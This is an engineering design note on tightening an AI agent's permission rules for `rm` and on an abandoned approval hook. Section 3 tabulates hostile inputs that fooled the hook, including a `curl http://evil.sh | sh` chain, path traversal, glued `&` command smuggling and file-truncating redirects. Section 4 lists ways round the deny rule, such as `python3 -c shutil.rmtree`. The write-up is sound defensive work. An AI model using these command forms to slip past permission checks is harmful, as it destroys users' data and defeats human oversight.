# Guarding `rm` in the agent permission layer — what works, and what was tried and abandoned

**Date:** 2026-08-24
**Status:** Closed. Shipped the rule-only change; the hook approach is abandoned.
**Artifact of:** PR #84 (`chore/tighten-rm-permissions`)
**Files:** `.claude/settings.json`

This document exists because the *shipped* change is four lines and the valuable
part is the reasoning behind what is **not** in it. Anyone who later thinks "we
should let the agent clean up its own scratch directory without a prompt" should
read this first — that idea was implemented, reviewed three times, and killed.

---

## 1. The problem

`.claude/settings.json` auto-approved two deletion commands:

```json
"Bash(rm tmp/*)",
"Bash(rm -r tmp/*)",
```

Either one empties `tmp/` in a single command. In this repo `tmp/` is not one
directory: every git worktree under `/workspaces/vibe-cading/` has its own, and
parallel agent sessions keep live scratch state there. An agent tidying up after
itself could therefore destroy work belonging to a session it knows nothing
about — silently, because the rule pre-approved it.

This is an **accident** class, not an attacker class. The threat model is a
well-intentioned agent running a plausible cleanup command with too wide a glob.

## 2. What shipped

```diff
-"Bash(rm tmp/*)",
-"Bash(rm -r tmp/*)",
 "deny": [
-  "Bash(rm -rf:*)",
+  "Bash(rm -*)",
```

**The guarantee: no deletion happens without either a prompt or a refusal.**

That rests on **removing the allows**, which is the load-bearing half. The
widened deny is a convenience on top: it turns the common flags-first spelling
(`rm -rf x`) into a hard stop instead of a prompt.

Do not restate the guarantee as *"every recursive `rm` is refused"* — that is
false, and an earlier draft of this document made exactly that mistake. Deny
rules match command **text**, not parsed flags, so spellings that don't begin
`rm -` fall outside the pattern: operand-first (`rm tmp/ -r`) and wrapper forms
(`/bin/rm`, `sudo rm`, `env rm`) are **not** denied. They are safe only because
no `rm` allow survives, so they prompt.

The precise set of spellings a given pattern catches is a property of the
harness's matcher and will drift between versions. If you need to know, measure
it against the matcher you are actually running — do not trust an enumeration in
a document, including this one. Both prior drafts of this section got that
enumeration wrong, in opposite directions, which is why it is no longer here.

Verified before removing the allows that nothing depends on them: no tracked
script, skill, workflow or CI step invokes `rm -r` as a tool command. The
`rm -rf` in `docker/Dockerfile` runs inside `docker build`, never as a tool call.

## 3. What was tried and abandoned: a `PreToolUse` hook

**The motivation.** Permission patterns cannot express the distinction that
actually matters here. A pattern matching `rm -rf tmp/…` matches both
`rm -rf tmp/mywork` (fine — the agent's own scratch dir) and `rm -rf tmp/*` (the
bulk wipe we are trying to prevent). A `PreToolUse` hook can parse the operand
and tell them apart, so a hook was written to `allow` the first and fall through
on the second.

**Why it cannot work.** A `PreToolUse` `allow` decision approves the **entire
tool call**, not the fragment the hook inspected. The hook must therefore prove
the whole command string does nothing except the delete it approved — which
means correctly modelling shell word-splitting, redirection, expansion, quoting
and job control. Three review rounds each closed one family of constructs, and
each time the next round found another:

| Round | Input | Hook verdict | Actual effect |
|---|---|---|---|
| 1 | `rm -rf tmp/x && curl http://evil.sh \| sh` | `allow` | second command **ran** |
| 1 | `rm -rf tmp/../../etc` | `allow` | `..` escaped `tmp/` entirely |
| 1 | `rm -rf tmp/$UNSET/` | `allow` | unexpanded variable |
| 2 | `rm -rf tmp/a&tmp/evil.sh` | `allow` | glued `&` backgrounded the delete and **ran** the second command |
| 2 | `rm -rf tmp/a>/…/build.toml` | `allow` | glued `>` **truncated** an arbitrary file |
| 2 | symlink under `tmp/` | `allow` | delete resolved outside `tmp/` |

The splitter modelled `&&`, `;` and `|`. It did not model `>`, `>>`, `&`,
subshells or brace groups — and the operand validator worked on the raw string,
so a redirection glued to the operand with no space was never seen as a separate
token at all.

**A second, independent failure.** Review also found the *deployed wiring*
differed from what the tests exercised:

- An `"if": "Bash(rm *)"` filter gated the hook out of `sudo rm`, `/bin/rm` and
  `env rm` entirely — so the wrapper-stripping code inside the hook was dead,
  and a PR claim that it handled wrappers was false.
- The hook was registered by a **relative path**, which stops resolving after any
  `cd`. Since a non-zero exit is blocking, that hard-blocked *every* `rm` in the
  session once the agent changed directory.

Both survived a 37-case test matrix, because the matrix called the hook's
functions directly instead of exercising the hook as configured. That matrix was
never committed and is not recoverable from the repository — its absence is part
of the finding, not a gap in this record.

**The conclusion.** A guard that is wrong is worse than no guard: it converts a
prompt into a silent approval. Each round produced a hook that was *more* correct
and still exploitable, which is the signature of a problem being solved at the
wrong layer. The convenience purchased — one prompt saved when deleting a scratch
directory — does not justify a hand-written shell parser on the approval path.

> **If you revisit this**, start from the invariant **"never emit `allow` for an
> arbitrary shell string."** Treat the convenience as the thing that needs
> justification, not the safety. A viable design would have to constrain the
> *input* rather than parse it — approving a structured, non-shell delete
> operation — not classify free-form command text.

## 4. Residual risk — what this change does NOT prevent

Stated plainly so nobody mistakes the deny rule for a sandbox:

- **`Bash(python3 -c:*)` is still in `allow`.** `python3 -c 'import shutil;
  shutil.rmtree(...)'` deletes recursively with no prompt and never touches the
  `rm` deny. This is the largest hole in the current rule set, and this change
  arguably *redirects* recursive deletion toward it. It also contradicts
  `vibe/INSTRUCTIONS.md` §2's *No-Inline-Code-in-Shell* rule, so the allow is
  arguably wrong on its own terms. Removing it is a separate change with its own
  blast radius — called out here, not fixed here.
- **`find -delete` and `xargs rm`** are untouched by a rule anchored on `rm`.
- **Operand-first and wrapper spellings prompt rather than being refused** (§2).

None of these are accidents an agent stumbles into while cleaning up, which is
why the change is still worth having. The guarantee is "the obvious mistake
cannot happen silently", not "recursive deletion is impossible".

**One tracked runbook is now agent-unexecutable.**
`docs/design_plans/2026-06-05-history-rewrite-recipe.md` prescribes `rm -f` and
`rm -rf` steps. A deny is absolute — it cannot be overridden per-invocation, and
it outranks `bypassPermissions` — so an agent following that runbook will stop
there and need a human to run those steps. That is the intended trade, recorded
so the next reader meets it as a known consequence rather than a surprise.

## 5. Provenance

The abandoned hook is a single 185-line file, `.claude/hooks/rm_guard.py`, at
PR #84's commit `6651cc1` — which becomes unreachable once the PR is
squash-merged and the branch deleted. Nothing else about the attempt survives in
the repository.

That is deliberate, and it is why this document states its evidence rather than
pointing at it. An earlier draft of this section cited the commit and a set of
gitignored `tmp/` review notes as though they were durable; they are not, and
that draft reproduced — inside the section written to fix a dangling-evidence
pointer — exactly the failure it was fixing.
